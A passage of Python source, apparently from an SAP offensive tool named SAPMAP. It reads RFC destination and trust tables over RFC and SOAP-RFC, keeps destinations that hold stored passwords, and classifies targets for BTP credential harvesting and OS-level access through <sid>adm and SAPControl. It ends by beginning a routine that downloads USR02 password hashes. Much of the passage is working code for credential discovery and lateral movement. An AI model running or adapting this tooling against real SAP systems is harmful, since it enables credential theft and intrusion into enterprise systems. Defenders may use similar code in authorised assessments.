        # -- reassemble & decompress -----------------------------------
        box = result.get('BOX4096', [])
        raw = b''.join(
            row.get('LINE', b'') for row in box
            if isinstance(row.get('LINE'), bytes)
        )
        # First 8 bytes are a transport pre-header; SAP compression
        # header starts at offset 8.
        sap_compressed = raw[8:]

        proc = subprocess.run(
            [decompress_bin], input=sap_compressed,
            capture_output=True, timeout=30,
        )
        if proc.returncode != 0 or not proc.stdout:
            err = proc.stderr.decode(errors='replace').strip()
            print(f"[-] {node.sid}: SAP decompression failed: {err}")
            return connections

        decompressed = proc.stdout
        row_size = len(decompressed) // nr_rows if nr_rows else 0
        if row_size == 0:
            return connections

        # -- parse rows in UC (UTF-16-LE) format -----------------------
        # RFCDEST   offset 0    len 64  (CHAR 32)
        # RFCTYPE   offset 64   len 2   (CHAR 1)
        # RFCOPTIONS offset 66  len 500 (CHAR 250)
        for r in range(nr_rows):
            rd = decompressed[r * row_size : (r + 1) * row_size]
            if len(rd) < 566:
                continue
            rfcdest = rd[0:64].decode('utf-16-le', errors='replace'
                                      ).rstrip('\x00').strip()
            rfctype = rd[64:66].decode('utf-16-le', errors='replace'
                                       ).rstrip('\x00').strip()
            rfcoptions = rd[66:566].decode('utf-16-le', errors='replace'
                                           ).rstrip('\x00').strip()
            if not rfcdest or rfctype not in ('3', 'G', 'H'):
                continue
            has_pwd = '%_PWD' in rfcoptions
            if not has_pwd and rfctype in ('G', 'H'):
                continue

            conn_obj = _build_rfcdes_conn(
                node, rfcdest, rfctype, rfcoptions)
            # Trusted only if RFCOPTIONS has Q=Y (Type-3) — see
            # _rfcdes_is_trusted for the rationale.
            if _rfcdes_is_trusted(rfctype, rfcoptions):
                conn_obj.trusted_system = True
                conn_obj.trust_type = "trusted_rfc"
            connections.append(conn_obj)

        n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
        n3_trusted = sum(1 for c in connections
                         if (c.conn_type or "rfc") == "rfc" and c.trusted_system)
        nh = len(connections) - n3
        parts = [f"{n3} Type-3"]
        if n3_trusted:
            parts.append(f"({n3_trusted} trusted)")
        parts.append(f"+ {nh} Type-G/H connections via "
                     f"GET_TABLEBLOCK_COMPRESSED_RFC")
        print(f"[+] {node.sid}: Found {' '.join(parts)}")

    except Exception as e:
        logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC failed: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: GET_TABLEBLOCK_COMPRESSED_RFC fallback failed: {format_rfc_exception(e)}")

    return connections


def _parse_rfcdes_options(conn: RFCConn, options_str: str):
    """Parse RFCDES RFCOPTIONS field to extract host, instance, user, client."""
    for part in options_str.split(","):
        part = part.strip()
        if part.startswith("H="):
            conn.target_host = part[2:].strip()
        elif part.startswith("S="):
            conn.target_instance_nr = part[2:].strip()
        elif part.startswith("U="):
            conn.rfc_user = part[2:].strip()
        elif part.startswith("M="):
            conn.client = part[2:].strip()


def _parse_rfcdes_http_options(conn: RFCConn, options_str: str):
    """Parse RFCDES RFCOPTIONS for Type-G / Type-H destinations.

    SM59 HTTP destinations encode their target as a comma-separated
    keyed list inside RFCOPTIONS.  Kernel versions vary, but the
    common keys are:

      ``H=`` host
      ``S=`` port
      ``M=`` path (sometimes "M=" carries the full path without a
              leading slash)
      ``J=`` either an SSL flag (``2``, ``S``, ``Y``) OR — on newer
              kernels — the full target URL ``J=https://host/...``
      ``Q=`` ``Y`` ⇒ TLS, ``N`` ⇒ plain HTTP
      ``U=`` HTTP basic-auth user (only when stored creds, gated
              by the ``%_PWD`` marker the readers already check for)
      ``Y=`` logon language (ignored for our purposes)
      ``L=`` accept-language (ignored)
      ``T=`` SecStore-managed password marker (``%_PWD``)

    Sets ``conn.conn_type='http'`` and synthesises ``http_url``.
    The downstream BTP-credential harvester filters on host suffix
    so a best-effort URL is good enough; the secstore extraction
    fills in the password later when it matches the destination
    name.
    """
    conn.conn_type = "http"
    host = path = scheme_or_url = ""
    port_i = ""     # I=<port>  — Type-G (authoritative on modern kernels)
    port_s = ""     # S=<port>  — Type-H / older kernels
    use_https = False
    for part in options_str.split(","):
        part = part.strip()
        if part.startswith("H="):
            host = part[2:].strip()
        elif part.startswith("I="):
            # Type-G RFCDES stores the HTTP port in I=<port> —
            # authoritative when present.  Operator-reported:
            # I=50113 for a SAPControl destination that Type-G
            # writers stash there, while S= carries something
            # unrelated (or empty) so the S=-based path built
            # http://host/ with no port and http_dest_ping defaulted
            # to 80.
            port_i = part[2:].strip()
        elif part.startswith("S="):
            port_s = part[2:].strip()
        elif part.startswith("M="):
            path = part[2:].strip()
        elif part.startswith("J="):
            scheme_or_url = part[2:].strip()
        elif part.startswith("Q="):
            if part[2:].strip().upper() == "Y":
                use_https = True
        elif part.startswith("U="):
            conn.rfc_user = part[2:].strip()
        elif part.startswith("D="):
            # The D= field is overloaded across kernels + RFCTYPEs:
            #   * short numeric (≤3 digits) → SAP client (mandt)
            #   * everything else            → HTTP basic-auth user
            # Type-G rows on modern kernels stash the user in D=
            # rather than U= (operator-reported: SAPControl.CGI
            # destinations to sm1adm / sj1adm landed with rfc_user
            # blank because we only checked U=).  Numeric values keep
            # the historic "D=<mandt>" meaning to avoid regressing
            # older Type-H destinations that carry the client here.
            d_val = part[2:].strip()
            if d_val.isdigit() and len(d_val) <= 3:
                conn.client = d_val.zfill(3)
            elif d_val and not conn.rfc_user:
                conn.rfc_user = d_val
    # Port precedence: I=<port> (Type-G explicit) wins over S=<port>.
    # Reject non-digit values from either — some kernels put a service
    # name in S= (e.g. "sapms<SID>") which would crash the urlparse
    # int(port) call downstream.
    port = ""
    if port_i and port_i.isdigit():
        port = port_i
    elif port_s and port_s.isdigit():
        port = port_s
    # M=NNN heuristic for Type-H destinations: when the "path" field
    # is just a 3-digit number with no slashes, SM59 was almost
    # certainly using it to carry the SAP client (so the operator
    # could type "001" instead of a real ICF path).  Promote it to
    # conn.client so SOAP-RFC calls land on the intended client; drop
    # it from the URL so we don't probe http://host/001 (which 404s).
    if (path and path.isdigit() and len(path) <= 3
            and not conn.client):
        conn.client = path.zfill(3)
        path = ""
    # Some kernels stash the full URL in J= directly — honour that and
    # skip the host/port reassembly.
    if scheme_or_url.lower().startswith(("http://", "https://")):
        conn.http_url = scheme_or_url.rstrip("/") + (
            path if (path and path.startswith("/")) else
            ("/" + path if path else ""))
    else:
        if scheme_or_url.upper() in ("2", "S", "Y") or use_https:
            use_https = True
        proto = "https" if use_https else "http"
        norm_path = path if not path or path.startswith("/") else "/" + path
        if port and port not in ("80", "443"):
            conn.http_url = f"{proto}://{host}:{port}{norm_path}"
        else:
            conn.http_url = f"{proto}://{host}{norm_path}"
    # Auth type is best-effort; secstore-recovered passwords land in
    # conn.secstore_password regardless.  When the password marker is
    # absent the field stays "" and the harvester skips the row.
    if not conn.http_auth_type:
        conn.http_auth_type = "BASICAUTHENTICATION"


# RFCDES filter shared by every reader path.  '3' = Type-3 RFC,
# 'G' = HTTP-to-external, 'H' = HTTP-to-ABAP.  Avoids the IN-clause
# OpenSQL syntax mismatch on older kernels by OR-chaining instead.
_RFCDES_TYPE_FILTER = ("RFCTYPE = '3' OR RFCTYPE = 'G' OR "
                        "RFCTYPE = 'H'")


# ---------------------------------------------------------------------------
# Phase 3b: SOAP-RFC variants for HTTP-only ABAP targets
# ---------------------------------------------------------------------------
# Same FMs SAPMAP already calls via pyrfc (RFC_READ_TABLE on RFCDES /
# RFCTRUST / RFCSYSACL); these helpers route the read through a
# SOAPRFCSession so Retrieve RFC Destinations works against a node
# whose gateway port (33NN) is firewalled.  Row parsing reuses
# _build_rfcdes_conn and _rfcdes_is_trusted unchanged — only the
# transport differs.

def retrieve_rfc_connections_via_soap(node: SAPNode,
                                       soap_session) -> list:
    """Read RFCDES via SOAP-RFC and build RFCConn list.

    soap_session: a configured SOAPRFCSession bound to the target node.
    Returns the same list shape as retrieve_rfc_connections — caller
    can feed it into the existing add_connection / ping pipeline
    without other changes.
    """
    connections = []
    print(f"[*] {node.sid}: reading RFCDES via SOAP-RFC...")
    r = soap_session.read_table(
        "RFCDES",
        fields=["RFCDEST", "RFCTYPE", "RFCOPTIONS"],
        where=[_RFCDES_TYPE_FILTER],
        max_rows=500,
    )
    if not r["ok"]:
        print(f"[-] {node.sid}: SOAP RFCDES read failed — "
              f"{r['error'][:120]}")
        return connections
    for row in r["rows"]:
        dest_name = (row.get("RFCDEST", "") or "").strip()
        rfctype = (row.get("RFCTYPE", "") or "").strip()
        options = (row.get("RFCOPTIONS", "") or "").strip()
        if not dest_name:
            continue
        has_pwd = "%_PWD" in options
        # Type-G/H without %_PWD = no recoverable credential, skip
        if not has_pwd and rfctype in ("G", "H"):
            continue
        conn_obj = _build_rfcdes_conn(node, dest_name, rfctype, options)
        if _rfcdes_is_trusted(rfctype, options):
            conn_obj.trusted_system = True
            conn_obj.trust_type = "trusted_rfc"
        connections.append(conn_obj)
    n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
    n3_trusted = sum(1 for c in connections
                     if (c.conn_type or "rfc") == "rfc"
                     and c.trusted_system)
    nh = len(connections) - n3
    bits = [f"{n3} Type-3"]
    if n3_trusted:
        bits.append(f"({n3_trusted} trusted)")
    bits.append(f"+ {nh} Type-G/H via SOAP-RFC RFCDES")
    print(f"[+] {node.sid}: found {' '.join(bits)}")
    return connections


def retrieve_rfctrust_via_soap(node: SAPNode, soap_session) -> list:
    """Read RFCTRUST via SOAP-RFC.  Same return shape as
    retrieve_rfctrust (list of dicts with rfctrustid / rfctrustsy / ...).

    Schema-probed like retrieve_rfcsysacl_via_soap — some kernels lack
    one of the metadata columns; the cheap NO_DATA pre-call keeps us
    resilient across kernel versions."""
    entries = []
    wanted = [
        "RFCTRUSTID", "RFCTRUSTSY", "TLICENSE_NR",
        "LLICENSE_NR", "RFCMSGSRV",
    ]
    fields_to_read = _soap_existing_fields(
        soap_session, "RFCTRUST", wanted) or ["RFCTRUSTID"]
    r = soap_session.read_table(
        "RFCTRUST", fields=fields_to_read, max_rows=200)
    if not r["ok"]:
        err = r["error"]
        if ("NOT_AUTHORIZED" in err or "TABLE_WITHOUT_DATA" in err
                or "TABLE_NOT_AVAILABLE" in err):
            print(f"[*] {node.sid}: RFCTRUST not readable via SOAP "
                  f"(auth or empty)")
        else:
            print(f"[-] {node.sid}: Could not read RFCTRUST via SOAP: "
                  f"{err[:80]}")
        return entries
    for row in r["rows"]:
        entry = {
            "rfctrustid":  (row.get("RFCTRUSTID", "") or "").strip(),
            "rfctrustsy":  (row.get("RFCTRUSTSY", "") or "").strip(),
            "tlicense_nr": (row.get("TLICENSE_NR", "") or "").strip(),
            "llicense_nr": (row.get("LLICENSE_NR", "") or "").strip(),
            "rfcmsgsrv":   (row.get("RFCMSGSRV", "") or "").strip(),
        }
        # Skip rows with no target — empty RFCTRUSTID is a deleted row
        if not entry["rfctrustid"]:
            continue
        entries.append(entry)
    if entries:
        targets = [e["rfctrustid"] for e in entries]
        print(f"[+] {node.sid}: RFCTRUST has {len(entries)} outbound "
              f"trust entries → {', '.join(targets)} (via SOAP-RFC)")
    else:
        print(f"[*] {node.sid}: RFCTRUST is empty — no outbound "
              f"trusted-RFC relationships")
    return entries


def _soap_existing_fields(soap_session, table: str,
                           wanted: list) -> list:
    """Probe `table`'s schema via NO_DATA=X and intersect with `wanted`.

    Some tables (notably RFCSYSACL) carry different field sets across
    kernel versions — kernel 742 has RFCTRUSTSY/RFCATRUSER where 754
    has RFCEQUSER/RFCUSER.  Requesting a missing field raises
    FIELD_NOT_VALID and aborts the whole read.  This helper does a
    cheap NO_DATA=X call first (metadata-only — SAP returns FIELDS
    table without any DATA rows) and returns only the fields that
    exist on the target kernel.

    Returns the original `wanted` list on probe failure (schema
    discovery isn't strictly required — caller will get a
    FIELD_NOT_VALID error and degrade gracefully).
    """
    # Use NO_DATA=X envelope directly — bypasses the high-level
    # read_table which would try to fetch every row of every field
    # (max_rows=0 means "no limit" in RFC_READ_TABLE, NOT "skip
    # data") and trip DATA_BUFFER_EXCEEDED on large tables.
    try:
        from sap_soap_envelopes import (
            build_rfc_read_table, parse_response)
        body = build_rfc_read_table(table, no_data=True)
        response_xml = soap_session._post_soap(body)
        parsed = parse_response(response_xml, "RFC_READ_TABLE")
    except Exception:
        return wanted
    if not parsed.get("ok"):
        return wanted
    available = set()
    for row in parsed.get("tables", {}).get("FIELDS", []):
        name = (row.get("FIELDNAME", "") or "").strip()
        if name:
            available.add(name)
    if not available:
        return wanted
    return [f for f in wanted if f in available]


def retrieve_rfcsysacl_via_soap(node: SAPNode, soap_session) -> list:
    """Read RFCSYSACL via SOAP-RFC.  Same return shape as
    retrieve_rfcsysacl (list of dicts with rfcsysid / rfcclient / ...).

    Older kernels (742 et al.) have a different RFCSYSACL schema than
    newer ones — RFCEQUSER / RFCUSER may be missing.  We probe column
    availability first so the read succeeds on either kernel; absent
    fields surface as '' in the returned dicts."""
    entries = []
    wanted = [
        "RFCSYSID", "RFCCLIENT", "RFCEQUSER",
        "RFCUSER", "RFCSNC", "RFCSAMEUSR",
    ]
    fields_to_read = _soap_existing_fields(
        soap_session, "RFCSYSACL", wanted)
    if not fields_to_read:
        # Defensive — table itself missing or no overlap; fall back
        # to just the SID so the caller still gets row count.
        fields_to_read = ["RFCSYSID"]
    r = soap_session.read_table(
        "RFCSYSACL", fields=fields_to_read, max_rows=200)
    if not r["ok"]:
        err = r["error"]
        if ("NOT_AUTHORIZED" in err or "TABLE_WITHOUT_DATA" in err
                or "TABLE_NOT_AVAILABLE" in err):
            print(f"[*] {node.sid}: RFCSYSACL not readable via SOAP "
                  f"(auth or empty)")
        else:
            print(f"[-] {node.sid}: Could not read RFCSYSACL via SOAP: "
                  f"{err[:80]}")
        return entries
    skipped = set(wanted) - set(fields_to_read)
    if skipped:
        print(f"[*] {node.sid}: RFCSYSACL on this kernel lacks "
              f"{sorted(skipped)} — those fields surface as empty")
    for row in r["rows"]:
        entry = {
            "rfcsysid":   (row.get("RFCSYSID", "") or "").strip(),
            "rfcclient":  (row.get("RFCCLIENT", "") or "").strip(),
            "rfcequser":  (row.get("RFCEQUSER", "") or "").strip(),
            "rfcuser":    (row.get("RFCUSER", "") or "").strip(),
            "rfcsnc":     (row.get("RFCSNC", "") or "").strip(),
            "rfcsameusr": (row.get("RFCSAMEUSR", "") or "").strip(),
        }
        if not entry["rfcsysid"]:
            continue
        entries.append(entry)
    if entries:
        eq_y = sum(1 for e in entries if e["rfcequser"] == "Y")
        print(f"[+] {node.sid}: RFCSYSACL has {len(entries)} trusted-"
              f"caller entries ({eq_y} with RFCEQUSER=Y) (via SOAP-RFC)")
    else:
        print(f"[*] {node.sid}: RFCSYSACL is empty — no inbound "
              f"trusted-RFC callers configured")
    return entries


def _rfcdes_is_trusted(rfctype: str, options: str) -> bool:
    """Return True iff this RFCDES row represents a *trusted* RFC.

    The canonical marker SAP writes into RFCOPTIONS when "Trust
    Relationship = Yes" is set in SM59 is the comma-separated token
    ``Q=Y`` (Type-3 only — for Type-G/H the ``Q=`` flag means TLS).
    The match is **case-sensitive**: lowercase ``q=`` is a different
    RFCOPTIONS parameter entirely and must NOT be treated as a trust
    marker. Operator-reported false positives where local /
    no-password destinations were getting flagged as trusted RFC
    were traced to a previous ``.upper()`` normalisation that
    collapsed both spellings into the same bucket.

    Absence of ``%_PWD`` is NOT a trust indicator: many local /
    internal destinations (e.g. NONE, BACK, "@local", file
    destinations) have no stored password and are not trusted at
    all.
    """
    if rfctype != "3":
        return False
    for part in (options or "").split(","):
        # Strict case-sensitive match — capital Q only.
        if part.strip() == "Q=Y":
            return True
    return False


# SAP Note 1177315 — ADS RFC destination test returns 403/404/405/500
# on SM59 CONNECTION_TEST.  Root cause: SM59 fires a GET, the ADS
# SOAP endpoint on AS Java only accepts POST.  Java kernel version
# determines which status code comes back:
#   NW 04 / 7.0 / 7.0.1        → 403 (Web Service Navigator auth)
#   NW 7.1 / 7.11              → 404
#   NW 7.20 / 7.30 / 7.31+     → 405 (Expected POST, got GET)
#   SAP Cloud Platform Forms   → 500
# All four are benign — ADS works.  The diagnostic marker for the
# 7.20+ case is the string "Expected request method POST. Found GET."
# or the class name WSAddressingException, both of which leak into
# the CONNECTION_ERROR_TEXT that SDF/RFC_CHECK / DEST_CHECK_CONNECTION
# surface.
_NOTE_1177315_STATUSES = {"403", "404", "405", "500"}
_NOTE_1177315_MARKERS = (
    "expected request method post",         # NW 7.20+ SOAP fault
    "com.sap.soa.wsr.030104",                # SOAP fault code
    "wsaddressingexception",                  # AS Java class name
)
_HTTP_STATUS_RE = None  # lazy-compiled below


def interpret_http_dest_test_result(conn, result: dict) -> None:
    """Post-process a Type G/H test result per SAP Note 1177315.

    Mutates ``result`` in place, and sets ``conn.note_1177315_hit`` /
    ``conn.http_status`` when the reinterpretation fired.  Safe to
    call on Type-3 results too — the classification gates on
    ``conn.conn_type`` and returns without touching anything for
    plain RFC destinations.

    Rules (applied to the merged ``logon_message`` + ``error`` text):
    1. Extract HTTP status if the message contains one — SM59 usually
       renders it as "HTTP Response 405" or "status code: 405".
    2. If the destination is ADS-shaped (conn.is_ads_dest) AND the
       status is in {403, 404, 405, 500} → ping_ok=True,
       note_1177315_hit=True.
    3. If the message body matches one of the Note's diagnostic
       markers ("Expected request method POST", the SOAP fault code)
       → same treatment, and additionally set is_ads_dest=True
       retroactively (the marker proves it).
    """
    if (conn.conn_type or "rfc") != "http":
        return

    global _HTTP_STATUS_RE
    if _HTTP_STATUS_RE is None:
        import re
        _HTTP_STATUS_RE = re.compile(
            r'\b(?:HTTP\s+response\s*[:\s]|status(?:\s+code)?[:\s])\s*'
            r'(\d{3})\b', re.I)

    text = " ".join(filter(None, (
        result.get("logon_message", ""),
        result.get("error", ""),
    ))).lower()
    if not text:
        return

    # Pull HTTP status if it's in the text.  Populate conn.http_status
    # regardless of whether Note 1177315 fires — the UI badge uses it.
    m = _HTTP_STATUS_RE.search(text)
    if m and not conn.http_status:
        try:
            conn.http_status = int(m.group(1))
        except ValueError:
            pass

    marker_hit = any(marker in text for marker in _NOTE_1177315_MARKERS)
    if marker_hit and not conn.is_ads_dest:
        # Marker is definitive — retroactively classify as ADS.
        conn.is_ads_dest = True

    if conn.is_ads_dest and (
            marker_hit
            or (m and m.group(1) in _NOTE_1177315_STATUSES)):
        result["ping_ok"] = True
        conn.note_1177315_hit = True
        # Preserve the original diagnostic in logon_message so the
        # operator can still see why we reinterpreted, but tag it.
        orig = result.get("logon_message", "")
        marker_note = ("HTTP {}".format(conn.http_status)
                       if conn.http_status else "SOAP fault")
        result["logon_message"] = (
            f"{orig}  [Note 1177315: {marker_note} on ADS "
            f"destination — target answered; use FP_PDF_TEST_00 "
            f"to verify functionally]"
        ).strip()


def _classify_type_g_target(conn: RFCConn) -> None:
    """Classify a Type-G / Type-H HTTP destination into the buckets
    that drive downstream routing:

    * os_access_type    — SAPControl / Host Agent + <sid>adm heuristic
    * is_ads_dest       — Adobe Document Services (Note 1177315)
    * is_btp_dest       — target host matches BTP domain suffixes

    Reads conn.http_url, conn.rfc_user, conn.destination_name.
    """
    import re
    from urllib.parse import urlparse

    url = conn.http_url or ""
    if not url:
        return
    try:
        parts = urlparse(url)
    except Exception:
        return
    host = (parts.hostname or "").lower()
    port = parts.port or 0
    path = (parts.path or "").lower()
    user = (conn.rfc_user or "").strip()
    dest = (conn.destination_name or "").strip()

    # --- BTP target detection (target host is the classifier) ---------
    # Public BTP domains — hostnames that unambiguously identify a
    # tenant of SAP Business Technology Platform.  Cover the -com and
    # -cn (Alibaba region) variants, plus the newer .cloud.sap TLD.
    _BTP_SUFFIXES = (
        ".hana.ondemand.com",
        ".hana.ondemand.cn",
        ".cfapps.eu10.hana.ondemand.com",
        ".cfapps.us10.hana.ondemand.com",
        ".hana.ondemand.sap",
        ".cloud.sap",
        ".authentication.sap.hana.ondemand.com",
    )
    if any(host.endswith(sfx) for sfx in _BTP_SUFFIXES):
        conn.is_btp_dest = True
        conn.http_target_platform = (conn.http_target_platform
                                       or "BTP")

    # --- ADS (Adobe Document Services) detection ----------------------
    # Path or destination name gives it away.  Note 1177315 applies:
    # SM59 tests get 403/404/405/500 depending on Java kernel — all
    # benign, ADS itself works.
    if (re.search(r"/adobedocumentservices(sec)?/config",
                    path, re.I)
            or re.match(r"^ADS(_HTTPS?)?$", dest, re.I)
            or re.match(r"^FP_.*", dest, re.I)):
        conn.is_ads_dest = True
        # Java stack is the only place ADS runs.
        conn.http_target_platform = (conn.http_target_platform
                                       or "JAVA")

    # --- SAPControl / Host Agent + <sid>adm detection -----------------
    # Path matches: /SAPControl.CGI, /SAPHostControl.CGI, and the
    # underlying WSDL discovery endpoints.  Port matches: SAPControl
    # HTTP=5NN13, HTTPS=5NN14; Host Agent HTTP=1128, HTTPS=1129.
    # Real-world RFCDES rows often omit the M=<path> entirely (SAP
    # kernel supplies the default at runtime), so the URL parses to
    # scheme://host:port with an empty path — path-based detection
    # would miss those.  Classify as SAPControl when EITHER the path
    # signal is present OR the port is unambiguous SAPControl AND
    # the path doesn't clearly point somewhere else (empty, "/",
    # or ends in ".cgi").
    is_sapcontrol_path = ("/sapcontrol.cgi" in path
                          or "/sapcontrol/wsdl" in path)
    is_hostagent_path = ("/saphostcontrol.cgi" in path
                          or "/saphostagent/wsdl" in path)
    port_is_sapcontrol = (
        50000 <= port <= 59999 and port % 100 in (13, 14)
    )
    port_is_hostagent = port in (1128, 1129)
    path_is_unspecific = (
        not path or path == "/" or path.endswith(".cgi")
    )

    # <sid>adm user pattern.  Case-insensitive on Unix (sj1adm),
    # Windows equivalent SAPService<SID>, and the multi-SID sapadm
    # for the Host Agent.  Anchored so we don't false-positive on
    # user names like "MYCOMPANY_ADM".
    is_sidadm_user = bool(
        re.match(r"^[A-Za-z0-9]{3}adm$", user)
        or re.match(r"^SAPService[A-Z0-9]{3}$", user)
    )
    is_sapadm_user = user.lower() == "sapadm"

    if is_hostagent_path or (port_is_hostagent and path_is_unspecific):
        conn.os_access_type = (
            "hostagent_sapadm" if is_sapadm_user
            else "hostagent_generic"
        )
    elif is_sapcontrol_path or (port_is_sapcontrol and path_is_unspecific):
        conn.os_access_type = (
            "sapcontrol_sidadm" if is_sidadm_user
            else "sapcontrol_generic"
        )


def _build_rfcdes_conn(node: SAPNode, dest_name: str,
                        rfctype: str, options: str) -> RFCConn:
    """Build an RFCConn from one RFCDES row, dispatching to the
    Type-3 or HTTP options parser based on ``rfctype``."""
    conn_obj = RFCConn(
        source_sid=node.sid,
        source_host=node.hostname or node.ip,
        destination_name=dest_name,
        rfc_type=(rfctype or "").strip().upper()[:1],
    )
    if rfctype in ("G", "H"):
        _parse_rfcdes_http_options(conn_obj, options)
        _classify_type_g_target(conn_obj)
    else:
        _parse_rfcdes_options(conn_obj, options)
    return conn_obj


# ---------------------------------------------------------------------------
# Read table data
# ---------------------------------------------------------------------------

def get_table_columns(node: SAPNode, table_name: str,
                       creds: Credentials = None) -> list:
    """Return the full list of column names on `table_name` via
    DDIF_FIELDINFO_GET.  Unlike RFC_READ_TABLE — which silently
    drops trailing columns when the row is wider than its 512-byte
    work area — DDIF reads the dictionary metadata directly and is
    independent of row width.  Returns ``[]`` on any failure
    (auth missing, FM unavailable, etc.) so the caller can decide
    whether to fall back to a heuristic read."""
    cols = []
    try:
        with _get_connection(node, creds) as conn:
            res = conn.call("DDIF_FIELDINFO_GET",
                             TABNAME=table_name)
            for row in (res.get("DFIES_TAB", []) or []):
                name = (row.get("FIELDNAME") or "").strip()
                if name and not name.startswith(".INCLUDE"):
                    cols.append(name)
    except Exception as e:
        from sapmap_errors import format_rfc_exception
        logger.debug(f"DDIF_FIELDINFO_GET on {table_name}@{node.sid} "
                     f"failed: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: DDIF_FIELDINFO_GET({table_name}) "
              f"failed — falling back to RFC_READ_TABLE for "
              f"column discovery")
    return cols


def read_table(node: SAPNode, table_name: str, fields: list = None,
               where: str = "", max_rows: int = 500,
               creds: Credentials = None,
               long_strings: bool = False,
               quiet: bool = False) -> list:
    """Read data from an SAP table via RFC_READ_TABLE.

    Args:
        table_name: SAP table name (e.g., "USR02", "T000")
        fields: list of field names to retrieve
        where: WHERE clause (e.g., "BNAME = 'DDIC'")
        max_rows: maximum rows to return
        long_strings: when True, set USE_ET_DATA_4_RETURN='X' on the
            RFC_READ_TABLE call so the kernel returns rows in the
            ET_DATA table whose WA is an unbounded STRING — bypasses
            the standard 512-byte WA limit AND lets the kernel
            include ABAP STRING / RAWSTRING / XSTRING columns that
            it normally drops from DATA.  Newer S/4 kernels ship
            with this; older ones ignore the flag and use DATA.
        quiet: when True, suppress the "Could not read <table>" console
            line on failure.  The error still goes to logger.error for
            diagnostics.  Used by callers that probe table existence
            speculatively (e.g. capability-analyser row-count cache)
            and handle the failure themselves.

    Returns:
        list of dicts with field values
    """
    rows = []

    try:
        with _get_connection(node, creds) as conn:
            params = {
                "QUERY_TABLE": table_name,
                "DELIMITER": "|",
                "ROWCOUNT": max_rows,
            }
            if fields:
                params["FIELDS"] = [{"FIELDNAME": f} for f in fields]
            if where:
                # Split WHERE into 72-char chunks (SAP table parameter limit)
                options = []
                while where:
                    chunk = where[:72]
                    options.append({"TEXT": chunk})
                    where = where[72:]
                params["OPTIONS"] = options
            if long_strings:
                params["USE_ET_DATA_4_RETURN"] = "X"

            result = conn.call(RFC_READ_TABLE, **params)

            # Parse field metadata.
            #
            # NB: when USE_ET_DATA_4_RETURN='X' is set, some S/4 kernels
            # populate ET_DATA but leave the FIELDS table EMPTY (the
            # metadata is normally synthesised for DATA, not ET_DATA).
            # Parsing the WA without column names produces a list of
            # empty dicts — visible to callers as "rows exist but every
            # BNAME / EXTID / TYPE is missing".  Recover by using our
            # REQUESTED ``fields`` as the column ordering — the kernel
            # honours the requested order in the WA on every version
            # we've seen.
            field_meta = result.get("FIELDS", [])
            field_names = [f.get("FIELDNAME", "").strip() for f in field_meta]
            field_offsets = [(int(f.get("OFFSET", 0)), int(f.get("LENGTH", 0)))
                            for f in field_meta]
            if not field_names and fields:
                field_names = list(fields)
                field_offsets = [(0, 0)] * len(field_names)

            # ET_DATA wins when populated — its WA is STRING-typed so
            # it carries values RFC_READ_TABLE's standard 512-byte WA
            # would have truncated/omitted.  Falls through to DATA on
            # kernels that don't honour USE_ET_DATA_4_RETURN.
            data = result.get("ET_DATA") or result.get("DATA") or []
            if long_strings and data:
                # Diagnostic: dump the first row's shape so kernel-
                # specific ET_DATA quirks are visible to the operator
                # without having to instrument live calls.
                first = data[0] if isinstance(data[0], dict) else {}
                shape_keys = sorted(first.keys()) if first else []
                wa_preview = (first.get("WA", "")[:120]
                               if first else "")
                print(f"[*] {node.sid}: {table_name} ET_DATA shape — "
                      f"{len(data)} row(s); row[0] keys: {shape_keys}; "
                      f"WA[:120]: {wa_preview!r}; "
                      f"field_names: {field_names}")

            # Two ET_DATA shapes seen in the wild:
            #   1. {"WA": "val1|val2|val3"} — standard delimited (older
            #      kernels and DATA fallback).
            #   2. {"CLIENT_UUID": "AABB", "CLIENT_ID": "cid", …}
            #      — typed-struct rows keyed by column name.  Some S/4
            #      patches return this when USE_ET_DATA_4_RETURN='X'.
            #      Key casing varies: uppercase (most kernels), lower
            #      (some pyrfc bindings), and PascalCase (rare).  Match
            #      case-insensitively so we don't silently emit empty
            #      row dicts when the kernel is being fancy.
            def _typed_struct_lookup(row_keys_lc, row, fname):
                k = row_keys_lc.get(fname.upper())
                if k is None:
                    return None
                return row.get(k)

            for row in data:
                if not isinstance(row, dict):
                    continue
                wa = row.get("WA", "") or row.get("Wa", "") or row.get("wa", "")
                row_keys_lc = {k.upper(): k for k in row.keys()
                                if isinstance(k, str)}
                # Detect typed-struct rows: any of our requested fields
                # appears as a row key (case-insensitive).
                typed_match = any(fn.upper() in row_keys_lc
                                   for fn in field_names)
                if typed_match and (not wa or "|" not in wa):
                    row_dict = {}
                    for fname in field_names:
                        v = _typed_struct_lookup(row_keys_lc, row, fname)
                        if v is None:
                            v = ""
                        row_dict[fname] = (v.strip() if isinstance(v, str)
                                            else v)
                    rows.append(row_dict)
                    continue
                parts = wa.split("|")
                row_dict = {}
                for i, fname in enumerate(field_names):
                    if i < len(parts):
                        row_dict[fname] = parts[i].strip()
                    else:
                        row_dict[fname] = ""
                rows.append(row_dict)

            # Sanity check — if EVERY parsed row has all-empty values
            # for the requested fields, our parser missed the schema.
            # Print a loud diagnostic so the operator can capture the
            # raw ET_DATA shape and report it.  We do NOT retry
            # automatically here (the caller should — e.g.
            # download_usrextid has a long_strings → MANDT/BNAME-only
            # fallback that survives this).
            if long_strings and rows and fields and all(
                    not any((r.get(f) or "").strip() for f in fields)
                    for r in rows):
                from sapmap_errors import format_rfc_exception  # noqa
                logger.error(
                    f"{table_name}@{node.sid}: long_strings parse "
                    f"produced empty rows — ET_DATA shape did not "
                    f"match either delimited-WA or typed-struct form.")
                if not quiet:
                    print(f"[!] {node.sid}: {table_name} long_strings "
                          f"parse produced empty rows.  Raw ET_DATA "
                          f"row[0] = {data[0]!r}.")

    except Exception as e:
        from sapmap_errors import format_rfc_exception
        detail = format_rfc_exception(e)
        logger.error(f"Table read failed for {table_name}@{node.sid}: {detail}")
        if not quiet:
            print(f"[-] {node.sid}: Could not read {table_name}: {detail}")

    return rows


# ---------------------------------------------------------------------------
# Download password hashes
# ---------------------------------------------------------------------------

def download_password_hashes(node: SAPNode,
                             creds: Credentials = None) -> list:
    """Download password hashes from USR02 table.

    Tries two methods in order:
      1. SXPG database CLI (hdbsql/sqlcli/sqlcmd/sqlplus) — returns FULL hashes
         with BINTOHEX/RAWTOHEX encoding (no truncation)
